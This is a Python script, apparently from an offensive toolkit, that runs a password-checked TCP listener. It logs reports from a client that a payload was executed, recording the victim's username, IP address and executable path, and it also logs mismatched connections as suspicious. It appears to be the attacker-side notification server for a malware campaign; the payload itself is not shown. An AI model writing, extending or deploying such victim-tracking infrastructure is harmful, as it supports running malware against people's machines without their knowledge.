import  socket
import os.path
import datetime
current_date = datetime.date.today()
__author__ = "theattacker"
susipsname = "susips.txt"
logsname = "serverlogs.txt"
github = "https://github.com/TheNewAttacker64/"
def createtxtfile():

    if os.path.exists(susipsname) == False:
        with open(susipsname, 'w') as f:
            pass
    if os.path.exists(logsname) == False:
        with open(logsname, 'w') as f:
            pass
    pass

def banner(author,github):
    banner = f"""
    
  _   _       _   _  __              _____                          
 | \ | |     | | (_)/ _|            / ____|                         
 |  \| | ___ | |_ _| |_ _   _ _____| (___   ___ _ ____   _____ _ __ 
 | . ` |/ _ \| __| |  _| | | |______\___ \ / _ \ '__\ \ / / _ \ '__|
 | |\  | (_) | |_| | | | |_| |      ____) |  __/ |   \ V /  __/ |   
 |_| \_|\___/ \__|_|_|  \__, |     |_____/ \___|_|    \_/ \___|_|   
                         __/ |                                      
                        |___/                                       
Made By {author}
Github:{github}
    """
    return  banner



def serverconf(port,password):
    Server = socket.socket()
    Server.bind(("0.0.0.0", port))
    Server.listen(1)
    print(f"[+] listening on port {port}")
    while True:
        try:
            (clientsocket, address) = Server.accept()

            data = clientsocket.recv(1024).decode('utf-8').strip()
            clipass = data.split("|")

            username = clipass[1]
            exepath = clipass[2]
            if password != clipass[0]:

                clientsocket.close()
                with open(susipsname, "a") as susips:

                    susips.write(f"""
                    ---------------------------------------------------------------------------------
                    CameFrom={address}|SentMessageInsteadofTheKey={data}|Date={current_date}
                    ---------------------------------------------------------------------------------
                    \n          
                                        """)
                    clientsocket.close()
            elif  clipass[0] == password:
                print(f"[+] Executed Payload on={username}|OnDate={current_date}|CameFrom={address}|ExePath={exepath} \n")
                with open(logsname, 'a') as log:
                    log.write(f"""
                                    [+] Executed Payload on={username}|OnDate={current_date}|CameFrom={address}|ExePath={exepath} \n
                                                    """)

            else:
                pass
        except:
            continue



def main():
    print(banner(__author__,github))
    port = int(input("enter port:"))
    password = input("enter password(should be the same in the client):")
    serverconf(port,password)
main()








